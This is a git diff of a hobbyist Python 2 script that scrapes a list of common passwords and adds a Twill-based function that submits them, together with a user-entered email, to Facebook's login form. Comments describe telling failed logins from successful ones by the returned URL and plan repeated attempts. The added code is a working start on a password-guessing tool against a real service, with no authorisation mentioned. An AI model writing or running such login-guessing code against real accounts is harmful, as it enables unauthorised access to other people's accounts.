@@ -4,14 +4,31 @@
 # Extend program to take the most commonly used Passwords,
 # & write to to a file so we can grab whichever number we want in popularity
 # Extend program to keep pasting and trying password into a text box (possible)?
+# Notes to run this program you need to install pyperclip, BeautifulSoup, Twill, lxml, cssselect, requests
 
 import sys, pyperclip, urllib2
 from itertools import izip
 import re
 import time
-
+from lxml import html
+import requests
 from bs4 import BeautifulSoup
 from pprint import pprint
+from twill.commands import *
+
+# Here we can try some login attempts :)
+# After experimenting in Twill-sh if we attempt to login to FB with a wrong password
+# We will get current page: https://www.facebook.com/login.php?login_attempt=1&lwv=110
+# If we login with a correct attempt we just get https://www.facebook.com
+
+def loginToSite(passwords):
+    go('https://facebook.com/')
+    print "What email would you like to use?"
+    emailString = raw_input()
+    fv("1", "email", emailString)
+    fv("1", "pass", passwords)
+    submit()
+    info()
 
 def passwordFind(account, Passwords):
     if account in Passwords:
@@ -19,6 +36,20 @@ def passwordFind(account, Passwords):
         print('Password for ' + account + ' copied to clipboard.')
     else:
         print('There is no account named ' + account)
+    return Passwords[account]
+
+def yummySoup(account, page):
+    soup = BeautifulSoup(page, "html.parser")
+    all_tables=soup.find_all('table')
+    right_table=soup.find('table', class_='table')
+    d = {}
+    for row in right_table.findAll("tr"):
+        AccountLines = row.findAll('td')
+        if len(AccountLines)==8: #Only extract table body not heading
+            AccNum = AccountLines[0].getText()
+            CommonPasswords = AccountLines[1].getText()
+            d[AccNum] = CommonPasswords
+    return passwordFind(account, d)
 
 def passwordUpdate(filename):
     d = {}
@@ -32,7 +63,9 @@ def passwordUpdate(filename):
 def main2(account, filename):
     start=time.clock()
     dicA = passwordUpdate(filename)
-    passwordFind(account, dicA)
+    passwordAttempt = passwordFind(account, dicA)
+
+    loginToSite(passwordAttempt)
 
     end=time.clock()
     main2time=end-start
@@ -53,18 +86,9 @@ def main(account):
         passwordPage = passwordPage + nextPage + str(relatedPage)
 
     page = urllib2.urlopen(passwordPage)
-    #The acutal BS code
-    soup = BeautifulSoup(page, "html.parser")
-    all_tables=soup.find_all('table')
-    right_table=soup.find('table', class_='table')
-    d = {}
-    for row in right_table.findAll("tr"):
-        AccountLines = row.findAll('td')
-        if len(AccountLines)==8: #Only extract table body not heading
-            AccNum = AccountLines[0].getText()
-            CommonPasswords = AccountLines[1].getText()
-            d[AccNum] = CommonPasswords
-    passwordFind(account, d)
+
+    passwordString = yummySoup(account, page)
+    loginToSite(passwordString)
 
     end=time.clock()
     maintime=end-start
